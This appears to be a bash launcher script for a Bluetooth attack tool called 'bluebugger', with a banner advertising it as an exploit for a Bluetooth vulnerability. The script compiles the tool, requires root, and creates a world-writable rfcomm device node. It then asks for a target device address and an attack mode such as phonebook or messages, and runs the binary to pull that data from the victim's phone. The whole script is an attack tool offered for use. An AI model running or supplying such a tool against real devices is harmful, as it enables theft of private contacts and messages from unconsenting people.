# bin/bash

if [ ! -f "src/bluebugger" ]; then
    echo -e "\033[0;32mCompiling bluebugger..."
    make > /dev/null 2>&1
    echo -e "\033[0;31mChecking for root user..."
    sleep 0.3
else
    echo -e "\033[0;31mChecking for root user..."
    sleep 0.3
fi


if [[ $(id -u) -ne 0 ]] ; then 
   echo -e "\033[0;36mYou are Not Root! Please Run as root" ; exit 1 ; 
fi


mkdir -p /dev/bluetooth/rfcomm
mknod -m 666 /dev/bluetooth/rfcomm/0 c 216 0
clear
VERMILION='\033[0;31m'
GREEN='\033[0;32m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
WHITE='\033[0;37m'

echo -e "${VERMILION}           ____  _    _   _ _____ ____  _   _  ____  ____ _____ ____  "
echo -e "${VERMILION}          | __ )| |  | | | | ____| __ )| | | |/ ___|/ ___| ____|  _ \ "
echo -e "${WHITE}          |  _ \| |  | | | |  _| |  _ \| | | | |  _| |  _|  _| | |_) |"
echo -e "${WHITE}          | |_) | |__| |_| | |___| |_) | |_| | |_| | |_| | |___|  _ < "
echo -e "${GREEN}          |____/|_____\___/|_____|____/ \___/ \____|\____|_____|_| \__|"
echo -e "${CYAN}                                         Made by: ${WHITE}Webdragon63"
echo -e "${CYAN}                                                 Version : 1.1"
echo -e "${WHITE}             ..................................................."
echo -e "${BLUE}             YouTube Channel : www.youtube.com/@indiancyberarmy5"
echo -e "${WHITE}             ..................................................."
echo -e "${WHITE}________________________________________________________________________________"
echo -e "${BLUE}         ＥＸＰＬＯＩＴ  ＢＬＵＥＴＯＯＴＨ  ＶＵＬＮＥＲＥＢＩＬＩＴＹ "
echo -e "${WHITE}________________________________________________________________________________"
echo -e "${GREEN}"
echo -e "${CYAN}"
read -p "SET A BLUETOOTH ADDRESS ====>" ADDR
echo -e "${VERMILION}"
read -p "SET ATTACK MODE(e.g info, phonebook, messages) ====>" MODE
echo -e "${WHITE}"
read -p "SET OUTPUT PATH ====>" P
./src/bluebugger -a $ADDR $MODE -c 2 -o $P
